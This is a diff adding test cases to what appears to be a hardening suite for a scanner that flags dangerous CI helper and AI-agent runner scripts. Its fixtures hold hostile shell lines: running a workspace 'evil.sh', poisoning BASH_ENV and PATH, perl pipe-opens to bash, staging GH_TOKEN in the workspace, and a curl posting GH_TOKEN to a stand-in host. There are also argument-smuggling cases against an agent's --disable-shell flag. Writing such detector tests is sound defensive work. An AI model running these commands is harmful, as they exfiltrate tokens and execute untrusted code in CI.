@@ -173,5 +173,37 @@ t helper-heredoc-unquoted 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo
 t helper-heredoc-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<'EOF'${RS}$H${FS}cat <<'EOF'${FS}a${FS}\$(bash \"\${GITHUB_WORKSPACE}/evil.sh\")${RS}$H${FS}bash \"\${GITHUB_WORKSPACE}/evil.sh\"${FS}a${FS}EOF"
 t scalar-fake-step 1 "secret-step-untrusted-command" happy.sarif "$S${FS}bash \"\${SCRIPT_DIR}/guard.sh\"${FS}a${FS}          : <<'EOF'${RS}$S${FS}: <<'EOF'${FS}a${FS}          - name: fake${RS}$S${FS}- name: fake${FS}a${FS}          EOF${RS}$S${FS}          EOF${FS}a${FS}          curl -d \"\$GH_TOKEN\" https://example.invalid/x"
 
+# --- copy-class destinations (trusted tree, muse binary, workspace) ---
+t helper-cp-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp \"\${GITHUB_WORKSPACE}/evil.sh\" \"\${SCRIPT_DIR}/diff.sh\""
+t helper-tee-workspace 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo x | tee \"\${GITHUB_WORKSPACE}/t\""
+t helper-cp-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp /tmp/a /tmp/b"
+
+# --- indirect poison assignment (printf/read/getopts/loop/bare) ---
+t helper-printf-v 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v BASH_ENV '%s' \"\${GITHUB_WORKSPACE}/evil.sh\"; export BASH_ENV; bash \"\${SCRIPT_DIR}/diff.sh\""
+t helper-read-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}read -r PATH < /tmp/x"
+t helper-getopts-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}getopts ab PATH"
+t helper-for-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}for PATH in a b; do :; done"
+t helper-bare-bash-env 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}BASH_ENV=/tmp/evil"
+
+# --- deferred evaluators (trap handler, mapfile -C, schedulers) ---
+t helper-trap-exit 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}trap 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"' EXIT"
+t helper-trap-reset-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}trap - EXIT"
+t helper-mapfile-cb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mapfile -C 'bash \"\${GITHUB_WORKSPACE}/evil.sh\"' -c 1 < /tmp/x"
+t helper-at-deny 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}at now < /tmp/job"
+
+# --- perl opens (paren-free, sysopen) ---
+t helper-perl-openfree 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}open my \$fh2, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\"; close \$fh2;"
+t helper-perl-sysopen 1 "helper-perl-danger" happy.sarif "$P${FS}open(my \$fh${FS}a${FS}sysopen(FH2, \$f, O_RDWR);"
+
+# --- workspace writes (token staging) ---
+t helper-ws-redirect 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf '%s' \"\${GH_TOKEN}\" > \"\${GITHUB_WORKSPACE}/review-token\""
+
+# --- agent argv (value-boundary, scrub exactness, model shape) ---
+t runner-model-glue 1 "agent-shell-boundary" happy.sarif "$R${FS}  --disable-shell \\${FS}r${FS}--disable-shell${FS}--model \"--disable-shell --disable-write\""
+t runner-scrub-glue 1 "agent-token-isolation" happy.sarif "$R${FS}env -u GITHUB_TOKEN -u GH_TOKEN${FS}r${FS}-u GITHUB_TOKEN${FS}-u GITHUB_TOKEN=foo"
+t runner-model-args 1 "agent-model-args" happy.sarif "$R${FS}model_args+=(--model${FS}a${FS}  model_args+=(--enable-x)"
+t runner-unknown-flag 1 "agent-unknown-flag" happy.sarif "$R${FS}  --no-session-log \\${FS}a${FS}  --frobnicate \\"
+t runner-model-eq-fp 0 "" happy.sarif "$R${FS}  --max-model-steps 35 \\${FS}r${FS}--max-model-steps 35${FS}--max-model-steps=35"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
